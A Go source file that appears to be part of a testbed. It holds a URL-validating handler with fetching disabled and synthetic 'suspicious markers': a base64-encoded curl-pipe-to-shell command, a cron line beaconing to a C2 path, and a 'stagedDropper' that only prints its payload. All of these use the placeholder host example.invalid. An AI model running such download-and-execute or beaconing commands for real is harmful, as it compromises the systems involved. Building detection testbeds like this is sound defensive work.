package handlers

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"net/http"
	"net/url"
	"os/exec"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	if source != "" {
		parsed, err := url.Parse(source)
		if err != nil {
			writeBadRequest(w, "FetchTool url parse", err)
			return
		}
		if parsed.Scheme != "https" || parsed.Host == "" {
			writeBadRequest(w, "FetchTool url scheme", errors.New("url must use https"))
			return
		}
	}

	_ = json.NewEncoder(w).Encode(map[string]string{
		"status": "fetch disabled",
	})
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
